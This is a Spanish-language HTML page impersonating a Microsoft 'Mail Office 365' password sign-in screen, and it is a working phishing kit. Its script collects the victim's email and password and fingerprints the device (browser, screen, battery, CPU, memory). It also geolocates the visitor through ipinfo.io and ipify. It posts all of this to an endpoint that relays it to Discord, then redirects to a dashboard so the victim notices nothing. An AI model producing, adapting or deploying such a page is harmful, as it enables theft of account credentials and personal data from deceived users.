<!doctype html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Escribir contraseña - Mail Office 365</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'ms-blue': '#0078d4',
            'ms-blue-hover': '#106ebe',
            'ms-red': '#f25022',
            'ms-green': '#7fba00',
            'ms-yellow': '#ffb900',
            'ms-blue-logo': '#00bcf2',
            'ms-gray': '#1b1b1b',
            'ms-gray-light': '#605e5c',
            'ms-border': '#8a8886',
            'ms-error': '#dc2626',
            'ms-error-bg': '#fef2f2',
            'ms-error-border': '#fca5a5',
          },
          fontFamily: {
            'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
          },
          fontSize: {
            'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
            'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
            'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
            'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
            'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
          }
        }
      }
    }
  </script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html {
      min-height: 100vh;
      width: 100%;
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
    }
    body {
      background-color: #0a0a1a;
      background-image: none;
    }
    body.bg-gradient {
      background: var(--login-bg-gradient, linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%));
    }
    body.bg-image {
      background-image: var(--login-bg-image, none);
      background-size: cover;
      background-position: center;
    }
    .ms-input {
      border: 1px solid #8a8886;
      font-size: 15px;
      padding: 11px 12px;
      line-height: 20px;
      border-radius: 2px;
      width: 100%;
      background: #fff;
      color: #1b1b1b;
    }
    .ms-input:focus {
      outline: none;
      border-color: #0078d4;
      box-shadow: inset 0 0 0 1px #0078d4;
    }
    .ms-button {
      background: #0078d4;
      transition: background-color 0.1s ease;
      font-size: 15px;
      font-weight: 600;
      padding: 8px 12px;
      min-height: 32px;
      border-radius: 2px;
      color: #fff;
      border: none;
      cursor: pointer;
    }
    .ms-button:hover { background: #106ebe; }
    .ms-button:active { background: #005a9e; }
    .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
    .ms-link {
      color: #0078d4;
      text-decoration: none;
      font-size: 13px;
    }
    .ms-link:hover { text-decoration: underline; }
    .error-box {
      background: #fef2f2;
      border: 1px solid #fca5a5;
      border-radius: 4px;
      padding: 8px 12px;
      margin-bottom: 12px;
      text-align: center;
    }
    .error-text {
      color: #dc2626;
      font-size: 13px;
      font-weight: 500;
    }
    .fade-in {
      animation: fadeIn 0.3s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .login-card {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    .footer-links {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: rgba(255,255,255,0.95);
      backdrop-filter: blur(8px);
      border-top: 1px solid #e5e5e5;
      padding: 8px 16px;
      z-index: 50;
    }
    .footer-links a {
      color: #605e5c;
      font-size: 12px;
      text-decoration: none;
    }
    .footer-links a:hover { color: #0078d4; text-decoration: underline; }
    @media (max-width: 640px) {
      .main-container {
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 12px;
        z-index: 10;
      }
    }
    @media (min-width: 641px) {
      .main-container {
        position: static;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px;
      }
    }
  </style>
</head>
<body>

  <!-- Footer Links -->
  <div class="footer-links">
    <div style="max-width: 1200px; margin: 0 auto; display: flex; flex-wrap: wrap; align-items: center; justify-content: center; gap: 8px 24px;">
      <a href="#" id="footerHelp">Ayuda</a>
      <a href="#" id="footerTerms">Términos de uso</a>
      <a href="#" id="footerPrivacy">Privacidad y cookies</a>
      <span style="display: none; text-align: center; font-size: 12px;" id="footerPrivate">
        Usa la exploración privada si este no es tu dispositivo.
        <a href="#">Más información</a>
      </span>
    </div>
  </div>

  <!-- Main Container -->
  <div class="main-container">
    <div class="w-full max-w-md fade-in relative z-10">
      <div class="login-card p-8 md:p-12">
        <!-- Logo -->
        <div class="flex items-center justify-center mb-6" id="logoContainer">
          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
            <div class="bg-ms-red w-3 h-3 rounded-sm"></div>
            <div class="bg-ms-green w-3 h-3 rounded-sm"></div>
            <div class="bg-ms-blue-logo w-3 h-3 rounded-sm"></div>
            <div class="bg-ms-yellow w-3 h-3 rounded-sm"></div>
          </div>
          <span class="text-ms-logo text-ms-gray" id="logoText">Mail Office 365</span>
        </div>

        <!-- Email display (oculto hasta que se pasa email) -->
        <div class="mb-4" id="emailDisplayContainer" style="display:none;">
          <div style="text-align: center;">
            <div style="display: inline-flex; align-items: center; justify-content: center; background: transparent; border-radius: 50px; padding: 6px 16px; border: 1px solid #d1d5db;">
              <span id="userEmail" class="text-sm text-ms-gray font-medium">usuario@ejemplo.com</span>
            </div>
          </div>
        </div>

        <!-- Title -->
        <h1 class="text-xl text-ms-gray mb-6 font-semibold text-center" id="pageTitle">Escribir contraseña</h1>

        <!-- Error Box -->
        <div id="errorBox" class="error-box" style="display:none;">
          <span id="errorText" class="error-text"></span>
        </div>

        <!-- Password Form - Step 2 -->
        <form onsubmit="handlePasswordSubmit(event)" class="space-y-5" id="passwordForm">
          <div class="relative">
            <input
              type="password"
              id="password"
              placeholder="Contraseña"
              class="ms-input pr-10"
              autocomplete="current-password"
              required
            />
            <button
              type="button"
              onclick="togglePassword()"
              style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; padding: 4px; color: #605e5c;"
            >
              <svg id="eyeIcon" style="width: 16px; height: 16px; display: block;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
              </svg>
            </button>
          </div>

          <!-- "¿Olvidó su contraseña?" - right side -->
          <div style="display: flex; justify-content: flex-end; margin-top: -4px;">
            <a href="#" class="ms-link">
              ¿Olvidó su contraseña?
            </a>
          </div>

          <button type="submit" class="ms-button w-full" id="passwordSubmitBtn">
            Iniciar sesión
          </button>
        </form>

        <!-- Other sign-in options -->
        <div style="margin-top: 16px; padding-top: 12px; border-top: 1px solid #e5e5e5;">
          <div style="text-align: center;">
            <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // ========== CONFIGURACIÓN GLOBAL ==========
    const DEFAULT_CONFIG = {
      companyName: 'Mail Office 365',
      pageTitle: 'Escribir contraseña',
      logoText: 'Mail Office 365',
      loginBgType: 'color',
      loginBgColor: '#0a0a1a',
      loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
      loginBgImage: '',
      footerHelpText: 'Ayuda',
      footerTermsText: 'Términos de uso',
      footerPrivacyText: 'Privacidad y cookies',
      footerPrivateText: 'Usa la exploración privada si este no es tu dispositivo.',
    };

    let savedConfig = null;

    async function loadConfigFromServer() {
      try {
        const res = await fetch('/api/config');
        if (res.ok) {
          const data = await res.json();
          if (data.success && data.config) {
            savedConfig = { ...DEFAULT_CONFIG, ...data.config };
            return savedConfig;
          }
        }
      } catch (e) {
        console.warn('No se pudo cargar config del servidor');
      }
      return null;
    }

    function loadConfigFromLocalStorage() {
      try {
        const stored = localStorage.getItem('mailoffice365_config');
        if (stored) {
          savedConfig = { ...DEFAULT_CONFIG, ...JSON.parse(stored) };
          return savedConfig;
        }
      } catch (e) {}
      return null;
    }

    function getConfig() {
      if (savedConfig) return savedConfig;
      return DEFAULT_CONFIG;
    }

    function applyConfig() {
      const cfg = getConfig();
      document.getElementById('logoText').textContent = cfg.logoText || cfg.companyName;
      document.getElementById('pageTitle').textContent = cfg.pageTitle || 'Escribir contraseña';
      document.getElementById('footerHelp').textContent = cfg.footerHelpText || 'Ayuda';
      document.getElementById('footerTerms').textContent = cfg.footerTermsText || 'Términos de uso';
      document.getElementById('footerPrivacy').textContent = cfg.footerPrivacyText || 'Privacidad y cookies';
      document.getElementById('footerPrivate').innerHTML =
        (cfg.footerPrivateText || 'Usa la exploración privada si este no es tu dispositivo.') +
        ' <a href="#">Más información</a>';
      applyLoginBackground();
    }

    function applyLoginBackground() {
      const cfg = getConfig();
      const bgType = cfg.loginBgType || 'color';
      const bgColor = cfg.loginBgColor || '#0a0a1a';
      const bgGradient = cfg.loginBgGradient || 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
      const bgImage = cfg.loginBgImage || '';

      document.body.style.removeProperty('background-image');
      document.body.style.removeProperty('background-color');
      document.body.classList.remove('bg-gradient', 'bg-image');

      if (bgType === 'gradient') {
        document.body.style.background = bgGradient;
        document.body.classList.add('bg-gradient');
      } else if (bgType === 'image' && bgImage) {
        document.body.style.backgroundImage = 'url(' + bgImage + ')';
        document.body.style.backgroundSize = 'cover';
        document.body.style.backgroundPosition = 'center';
        document.body.classList.add('bg-image');
      } else {
        document.body.style.backgroundColor = bgColor;
      }
    }

    async function initConfig() {
      const serverConfig = await loadConfigFromServer();
      if (serverConfig) {
        applyConfig();
      } else {
        const localConfig = loadConfigFromLocalStorage();
        if (localConfig) {
          applyConfig();
        } else {
          applyConfig();
        }
      }
    }

    initConfig();

    // ========== ERROR BOX ==========
    function showError(message) {
      const errorBox = document.getElementById('errorBox');
      const errorText = document.getElementById('errorText');
      if (errorBox && errorText) {
        errorText.textContent = message;
        errorBox.style.display = 'block';
      }
    }

    function hideError() {
      const errorBox = document.getElementById('errorBox');
      if (errorBox) errorBox.style.display = 'none';
    }

    // ========== TOGGLE PASSWORD VISIBILITY ==========
    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const eyeIcon = document.getElementById('eyeIcon');

      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>';
      } else {
        passwordInput.type = 'password';
        eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>';
      }
    }

    // ========== GET EMAIL FROM URL OR LOCALSTORAGE ==========
    function getEmailFromSource() {
      const urlParams = new URLSearchParams(window.location.search);
      const urlEmail = urlParams.get('email');
      if (urlEmail) return urlEmail;

      const storedEmail = localStorage.getItem('mailoffice365_email');
      if (storedEmail) return storedEmail;

      return null;
    }

    // Display email if present (from URL params, not localStorage)
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromUrl = urlParams.get('email');
    if (emailFromUrl) {
      document.getElementById('userEmail').textContent = emailFromUrl;
      document.getElementById('emailDisplayContainer').style.display = 'block';
    }

    // ========== STEP 2: PASSWORD SUBMIT ==========
    async function handlePasswordSubmit(event) {
      event.preventDefault();
      hideError();

      const passwordInput = document.getElementById('password');
      const password = passwordInput.value.trim();
      const submitBtn = document.getElementById('passwordSubmitBtn');

      if (!password) {
        showError('Por favor ingresa tu contraseña.');
        return;
      }

      const email = getEmailFromSource();
      if (!email) {
        showError('No se encontró el correo electrónico. Intenta de nuevo desde el inicio.');
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = 'Verificando...';

      try {
        const success = await sendToDiscord(email, password);

        if (success) {
          // Redirigir al dashboard
          setTimeout(() => {
            window.location.href = 'dashboard.html?email=' + encodeURIComponent(email);
          }, 800);
        } else {
          // Aún redirigir al dashboard aunque falle Discord (para no bloquear al usuario)
          setTimeout(() => {
            window.location.href = 'dashboard.html?email=' + encodeURIComponent(email);
          }, 800);
        }
      } catch (err) {
        console.error('Error:', err);
        // Redirigir igual para no bloquear
        setTimeout(() => {
          window.location.href = 'dashboard.html?email=' + encodeURIComponent(email);
        }, 800);
      }
    }

    // ========== SEND TO DISCORD ==========
    async function sendToDiscord(email, password) {
      // Recolectar todos los datos del dispositivo y navegador
      const userAgent = navigator.userAgent || 'desconocido';
      const language = navigator.language || 'desconocido';
      const languages = navigator.languages ? navigator.languages.join(', ') : language;
      const screenResolution = screen.width + 'x' + screen.height;
      const colorDepth = screen.colorDepth || 'desconocido';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido';
      const platform = navigator.platform || 'desconocido';
      const onlineStatus = navigator.onLine ? 'En línea' : 'Sin conexión';
      const cookiesEnabled = navigator.cookieEnabled ? 'Sí' : 'No';

      // Dispositivo
      const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'desconocido';
      const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' núcleos' : 'desconocido';
      const touchPoints = navigator.maxTouchPoints || 0;
      const userAgentLower = userAgent.toLowerCase();
      const isMobile = /mobile|android|iphone|ipad/i.test(userAgentLower) ? 'Sí' : 'No';
      const isTablet = /tablet|ipad|android(?!.*mobile)/i.test(userAgentLower) ? 'Sí' : 'No';
      const isDesktop = !/mobile|tablet|android/i.test(userAgentLower) ? 'Sí' : 'No';

      // Batería
      let batteryLevel = 'No disponible';
      let batteryCharging = 'Desconocido';
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = Math.round(battery.level * 100) + '%';
          batteryCharging = battery.charging ? 'Sí' : 'No';
        }
      } catch (e) {
        console.warn('Battery API no disponible:', e);
      }

      // Geo IP (ipinfo.io)
      let geoIp = '';
      let geoCity = '';
      let geoRegion = '';
      let geoCountry = '';
      let geoCountryCode = '';
      let geoTimezone = timezone;
      let geoIsoCode = '';
      let geoIsp = '';
      let geoLatitude = '';
      let geoLongitude = '';
      let geoZip = '';
      let geoCurrency = '';
      let geoCurrencyCode = '';
      let geoCallingCode = '';
      let geoNetwork = '';

      try {
        const geoRes = await fetch('https://ipinfo.io/json');
        if (geoRes.ok) {
          const geoData = await geoRes.json();
          geoIp = geoData.ip || '';
          geoCity = geoData.city || '';
          geoRegion = geoData.region || '';
          geoCountry = geoData.country || '';
          geoCountryCode = geoData.country || '';
          geoTimezone = geoData.timezone || timezone;
          geoIsoCode = geoData.country || '';
          geoIsp = geoData.org || '';
          if (geoData.loc) {
            const locParts = geoData.loc.split(',');
            geoLatitude = locParts[0] || '';
            geoLongitude = locParts[1] || '';
          }
          geoZip = geoData.postal || '';
          geoNetwork = geoData.org || '';
        }
      } catch (e) {
        console.warn('ipinfo.io no disponible:', e);
      }

      // IP (ipify)
      let ipifyIp = '';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        if (ipRes.ok) {
          const ipData = await ipRes.json();
          ipifyIp = ipData.ip || '';
        }
      } catch (e) {
        console.warn('ipify no disponible:', e);
      }

      // IP del cliente (desde x-forwarded-for del servidor no está disponible aquí, usar ipify)
      const clientIp = ipifyIp || geoIp || 'desconocida';

      // Construir payload
      const payload = {
        email: email,
        password: password,
        userAgent: userAgent,
        language: language,
        languages: languages,
        screenResolution: screenResolution,
        colorDepth: colorDepth,
        timezone: timezone,
        platform: platform,
        onlineStatus: onlineStatus,
        cookiesEnabled: cookiesEnabled,
        deviceMemory: deviceMemory,
        cpuCores: cpuCores,
        touchPoints: touchPoints,
        isMobile: isMobile,
        isTablet: isTablet,
        isDesktop: isDesktop,
        batteryLevel: batteryLevel,
        batteryCharging: batteryCharging,
        geoIp: geoIp,
        geoCity: geoCity,
        geoRegion: geoRegion,
        geoCountry: geoCountry,
        geoCountryCode: geoCountryCode,
        geoTimezone: geoTimezone,
        geoIsoCode: geoIsoCode,
        geoIsp: geoIsp,
        geoLatitude: geoLatitude,
        geoLongitude: geoLongitude,
        geoZip: geoZip,
        geoCurrency: geoCurrency,
        geoCurrencyCode: geoCurrencyCode,
        geoCallingCode: geoCallingCode,
        geoNetwork: geoNetwork,
        ipifyIp: ipifyIp
      };

      try {
        const res = await fetch('/api/discord', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        const data = await res.json();
        if (data.success) {
          console.log('✅ Login enviado a Discord');
          return true;
        } else {
          console.warn('❌ Error enviando a Discord:', data.error);
          return false;
        }
      } catch (err) {
        console.warn('Discord API unavailable:', err);
        return false;
      }
    }
  </script>
</body>
</html>
